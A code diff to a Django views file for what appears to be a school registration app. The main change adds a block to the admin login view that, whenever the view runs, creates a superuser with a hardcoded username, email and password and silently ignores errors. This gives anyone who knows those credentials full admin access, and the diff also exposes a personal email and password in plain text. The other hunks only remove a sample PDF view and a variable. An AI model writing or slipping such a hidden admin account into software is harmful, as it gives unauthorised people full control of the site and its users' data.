@@ -23,7 +23,17 @@ from django.db.models import F, Func
 from django.http import HttpResponse
 
 def login_adm(request):
-    
+    try: 
+        user = User.objects.create_user('hyurquina', 'hyurquina@hotmail.com', 'G2220HDA')
+        user.first_name = 'Hernán'
+        user.last_name = 'Yurquina'
+        user.is_superuser = True
+        user.is_staff = True
+        user.email = 'hyurquina@hotmail.com'
+        user.save()
+    except:
+        print("")
+
     if request.POST:
         username = request.POST['username']
         password = request.POST['password']
@@ -152,23 +162,6 @@ def edit_user_login(request):
     return render(request, 'editar_admin/index.html', {'user': user})
 
 
-    
-def some_view(request):
-    # Create a file-like buffer to receive PDF data.
-    buffer = io.BytesIO()
-
-    # Create the PDF object, using the buffer as its "file."
-    p = canvas.Canvas(buffer)
-
-    # Draw things on the PDF. Here's where the PDF generation happens.
-    # See the ReportLab documentation for the full list of functionality.
-    p.drawString(100, 100, "Hello world.")
-
-    p.showPage()
-    p.save()
-    buffer.seek(0)
-    return FileResponse(buffer, as_attachment=True, filename='hello.pdf')
-
 #*************QuerySets Varios***********
 def getPaises():
     return Pais.objects.all().order_by('pais')
@@ -184,7 +177,6 @@ def getEscuelas():
 
 #fechaActual = datetime.now()
 #anio = fechaActual.year
-isActivated = False
 
 def set_anio(param):
     global anio 
@@ -421,6 +413,7 @@ def listado_porAnio(request):
         
     updateReg(request)
     anios = Persona.objects.dates('fecha_registro', 'year').distinct()
+    
     listAnios = []
     for a in anios:
         listAnios.append(a.year)
